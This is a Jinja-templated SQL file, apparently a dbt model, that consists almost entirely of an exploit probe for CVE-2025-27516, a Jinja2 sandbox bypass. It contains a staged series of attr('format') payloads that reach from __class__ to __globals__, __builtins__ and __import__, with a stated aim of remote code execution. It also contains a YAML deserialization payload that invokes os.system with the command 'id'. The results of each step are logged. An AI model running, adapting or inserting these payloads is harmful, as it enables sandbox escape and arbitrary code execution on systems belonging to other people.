{# CVE-2025-27516 Jinja2 < 3.1.6 sandbox bypass via attr("format") #}
{# If vulnerable: attr filter uses raw getattr() instead of environment.getattr() #}

{# Step 0: Check Jinja2 version #}
{%- set jinja_version = '' -%}
{%- if modules.jinja2 is defined -%}
  {{ log("JINJA2_VERSION=" ~ modules.jinja2.__version__, info=True) }}
{%- else -%}
  {{ log("JINJA2_NOT_IN_MODULES", info=True) }}
{%- endif -%}

{# Step 1: Test if attr("format") bypasses sandbox #}
{# This is the CVE-2025-27516 payload #}
{%- set payload1 = "{0.__class__}" -%}
{%- set result1 = payload1 | attr("format")(lipsum) -%}
{{ log("CVE_27516_TEST1=" ~ result1 | string | truncate(500), info=True) }}

{# Step 2: If step 1 works (returns a class reference), try deeper #}
{%- set payload2 = "{0.__class__.__init__.__globals__}" -%}
{%- set result2 = payload2 | attr("format")(lipsum) -%}
{{ log("CVE_27516_TEST2=" ~ result2 | string | truncate(500), info=True) }}

{# Step 3: Try to access builtins through format #}
{%- set payload3 = "{0.__class__.__init__.__globals__[__builtins__]}" -%}
{%- set result3 = payload3 | attr("format")(lipsum) -%}
{{ log("CVE_27516_TEST3=" ~ result3 | string | truncate(500), info=True) }}

{# Step 4: Try os.popen for RCE #}
{%- set payload4 = "{0.__class__.__init__.__globals__[__builtins__][__import__]}" -%}
{%- set result4 = payload4 | attr("format")(lipsum) -%}
{{ log("CVE_27516_TEST4=" ~ result4 | string | truncate(500), info=True) }}

{# Step 5: Alternative payload via str format_map #}
{# format_map passes the object directly, different path #}
{%- set alt_payload = "{x.__class__}" -%}
{%- set result5 = alt_payload.format_map({'x': ''}) -%}
{{ log("FORMAT_MAP_TEST=" ~ result5 | string | truncate(500), info=True) }}

{# Step 6: Try YAML deserialization (moved here to not block CVE test) #}
{%- set yaml1 = "test: value" -%}
{%- set yaml_safe = fromyaml(yaml1) -%}
{{ log("YAML_SAFE_PARSE=" ~ yaml_safe | string, info=True) }}

{%- set yaml2 = "!!python/object/apply:os.system ['id']" -%}
{{ log("YAML_DESER_ATTEMPTING=!!python/object/apply", info=True) }}
{%- set yaml_evil = fromyaml(yaml2) -%}
{{ log("YAML_DESER_RESULT=" ~ yaml_evil | string | truncate(200), info=True) }}

SELECT 1 as id
